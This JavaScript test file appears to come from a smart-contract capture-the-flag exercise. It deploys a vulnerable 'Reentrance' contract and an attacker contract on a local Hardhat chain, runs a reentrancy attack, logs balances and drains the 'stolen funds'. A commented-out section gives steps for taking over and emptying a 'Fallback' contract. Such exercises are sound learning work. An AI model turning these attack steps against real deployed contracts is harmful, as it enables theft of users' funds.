const { expect } = require("chai");
const { ethers } = require("hardhat");

const store = {}

describe("Reentrance", function () {
  it("Attack", async function () {
    const [user] = await ethers.getSigners();
    const _Reentrance = await ethers.getContractFactory("Reentrance");
    store.Reentrance = await _Reentrance.deploy();
    await store.Reentrance.waitForDeployment();

    const _Attack = await ethers.getContractFactory("ReentranceAttack");
    store.Attack = await _Attack.deploy(store.Reentrance.target);
    await store.Attack.waitForDeployment();
    
    await store.Reentrance.donate(user, {value: ethers.parseEther("0.1")});
    console.log("Reentrance balance:", await ethers.provider.getBalance(store.Reentrance.target));
    console.log("Attacker contract balance:", await ethers.provider.getBalance(store.Attack.target));
    
    try {
      // Fund and execute the attack
      const tx = await store.Attack.attack({ value: ethers.parseEther("0.1") });
      await tx.wait();
    } catch (error) {
      console.log(error);
    }
    
    console.log("Attack executed!");
    console.log("Reentrance balance:", await ethers.provider.getBalance(store.Reentrance.target));
    console.log("Attacker contract balance:", await ethers.provider.getBalance(store.Attack.target));

    // Withdraw stolen funds
    const tx2 = await store.Attack.drain();
    await tx2.wait();
    
  });

  /*
  it("Check owner", async function () {
    const { Fallback, owner } = store
    expect(await Fallback.owner()).to.eq(owner.address)
  });

  it("Claim owner", async function () {
    const { Fallback, user } = store
    await Fallback.connect(user).contribute({ value: ethers.parseEther('0.0001') })
    await user.sendTransaction({
      to: Fallback.target,
      value: 1
    })
    expect(await Fallback.owner()).to.eq(user.address)
  });

  it("Withdraw balance", async function () {
    const { Fallback, user } = store
    await Fallback.connect(user).withdraw()
    expect(await user.provider.getBalance(Fallback.target)).to.eq(0)
  });
  */
});
